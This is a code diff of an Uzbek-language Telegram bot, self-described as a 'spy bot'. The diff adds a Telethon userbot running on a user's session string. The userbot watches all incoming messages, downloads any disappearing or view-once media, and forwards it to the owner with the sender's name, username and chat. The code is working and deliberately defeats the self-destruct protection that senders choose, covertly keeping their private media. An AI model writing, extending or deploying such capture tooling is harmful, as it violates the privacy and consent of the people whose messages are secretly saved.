@@ -1,13 +1,19 @@
 from datetime import datetime
+import asyncio
+from threading import Thread
 import telebot
 from telebot import types
+from telethon import TelegramClient, events
+from telethon.sessions import StringSession
+from telethon.tl.types import MessageMediaPhoto
 
-from config import BOT_TOKEN, OWNER_ID
-from ai_reply import get_ai_reply
+from config import BOT_TOKEN, OWNER_ID, API_ID, API_HASH, SESSION_STRING
+from ai_reply import get_ai_reply, clear_history
 from keep_alive import keep_alive
 from storage import save_message as store, get_message, delete_from_cache
 
 bot = telebot.TeleBot(BOT_TOKEN)
+user_client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
 
 CHANNEL = "@umarjonovs"
 
@@ -40,20 +46,6 @@ def extract_media(message):
         return "video_note", message.video_note.file_id
     return None, None
 
-def is_disappearing(message):
-    """O'chib ketuvchi media tekshirish"""
-    try:
-        if message.photo and message.has_protected_content:
-            return True
-        if hasattr(message, 'self_destruct_time') and message.self_destruct_time:
-            return True
-        # view_once tekshirish
-        if hasattr(message, 'media') and hasattr(message.media, 'ttl_seconds'):
-            return message.media.ttl_seconds is not None
-    except:
-        pass
-    return False
-
 def send_media_to_owner(media_type, file_id, caption):
     try:
         if media_type == "photo":
@@ -75,7 +67,7 @@ def send_media_to_owner(media_type, file_id, caption):
         else:
             bot.send_message(OWNER_ID, caption, parse_mode="HTML")
     except Exception as e:
-        bot.send_message(OWNER_ID, f"{caption}\n\n⚠️ Media yuborishda xatolik: {e}", parse_mode="HTML")
+        bot.send_message(OWNER_ID, f"{caption}\n\n⚠️ Xatolik: {e}", parse_mode="HTML")
 
 def save_any_message(message):
     media_type, file_id = extract_media(message)
@@ -89,26 +81,6 @@ def save_any_message(message):
     }
     store(message.chat.id, message.message_id, data)
     return data
-
-def handle_disappearing(message, prefix=""):
-    """O'chib ketuvchi mediani owner ga yuborish"""
-    media_type, file_id = extract_media(message)
-    sender = get_sender(message)
-    chat_title = get_chat_name(message)
-    time_now = datetime.now().strftime("%H:%M:%S")
-
-    caption = (
-        f"👁 <b>{prefix}O'chib ketuvchi media!</b>\n"
-        f"👤 <b>Kim:</b> {sender}\n"
-        f"💬 <b>Chat:</b> {chat_title}\n"
-        f"🕐 <b>Vaqt:</b> {time_now}\n"
-        f"📁 <b>Tur:</b> {media_type or 'Nomalum'}"
-    )
-
-    if file_id:
-        send_media_to_owner(media_type, file_id, caption)
-    else:
-        bot.send_message(OWNER_ID, caption, parse_mode="HTML")
 
 
 # ── Obuna tekshirish ─────────────────────────────────────────────────────────
@@ -146,6 +118,7 @@ def on_start(message):
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
         types.InlineKeyboardButton("📢 Kanal", url="https://t.me/umarjonovs"),
+        types.InlineKeyboardButton("🔗 Profilga ulash yo'riqnomasi", url="https://t.me/umarjonovs"),
     )
 
     bot.send_message(
@@ -188,15 +161,8 @@ def on_check_sub(call):
 def on_message(message):
     if message.text and message.text.startswith('/'):
         return
-
     if not check_sub(message):
         return
-
-    # O'chib ketuvchi media tekshirish
-    if is_disappearing(message):
-        handle_disappearing(message)
-        return
-
     save_any_message(message)
 
 
@@ -240,11 +206,6 @@ def on_edited(message):
     'document', 'sticker', 'video_note'
 ])
 def on_business_message(message):
-    # O'chib ketuvchi media tekshirish
-    if is_disappearing(message):
-        handle_disappearing(message, prefix="Business | ")
-        return
-
     save_any_message(message)
 
     if message.text:
@@ -331,11 +292,71 @@ def on_reset(message):
     bot.reply_to(message, "✅ Suhbat tarixi tozalandi.")
 
 
+# ── Telethon — o'chib ketuvchi media ────────────────────────────────────────
+
+async def start_userbot():
+    await user_client.start()
+    print("✅ Userbot ulandi!")
+
+    @user_client.on(events.NewMessage(incoming=True))
+    async def on_user_message(event):
+        msg = event.message
+
+        # O'chib ketuvchi media tekshirish
+        if not msg.media:
+            return
+
+        ttl = getattr(msg.media, 'ttl_seconds', None)
+        if not ttl:
+            return
+
+        # Mediani yuklab olish
+        try:
+            sender = await event.get_sender()
+            chat = await event.get_chat()
+
+            sender_name = f"{getattr(sender, 'first_name', '') or ''} {getattr(sender, 'last_name', '') or ''}".strip()
+            username = f"@{sender.username}" if getattr(sender, 'username', None) else ""
+            chat_title = getattr(chat, 'title', None) or getattr(chat, 'first_name', None) or "Private"
+            time_now = datetime.now().strftime("%H:%M:%S")
+
+            caption = (
+                f"👁 <b>O'chib ketuvchi media!</b>\n"
+                f"👤 <b>Kim:</b> {sender_name} {username}\n"
+                f"💬 <b>Chat:</b> {chat_title}\n"
+                f"🕐 <b>Vaqt:</b> {time_now}"
+            )
+
+            media_bytes = await user_client.download_media(msg.media, bytes)
+
+            if isinstance(msg.media, MessageMediaPhoto):
+                bot.send_photo(OWNER_ID, media_bytes, caption=caption, parse_mode="HTML")
+            else:
+                bot.send_document(OWNER_ID, media_bytes, caption=caption, parse_mode="HTML")
+
+        except Exception as e:
+            bot.send_message(OWNER_ID, f"👁 O'chib ketuvchi media keldi, yuklab bo'lmadi: {e}")
+
+    await user_client.run_until_disconnected()
+
+
+def run_userbot():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_userbot())
+
+
 # ── Start ────────────────────────────────────────────────────────────────────
 
 def main():
     keep_alive()
-    bot.send_message(OWNER_ID, "✅ <b>Josus bot ishga tushdi!</b>", parse_mode="HTML")
+
+    # Userbot alohida threadda
+    t = Thread(target=run_userbot)
+    t.daemon = True
+    t.start()
+
+    bot.send_message(OWNER_ID, "✅ <b>Spy bot ishga tushdi!</b>", parse_mode="HTML")
     print("✅ Bot ishga tushdi!")
     bot.infinity_polling()
 
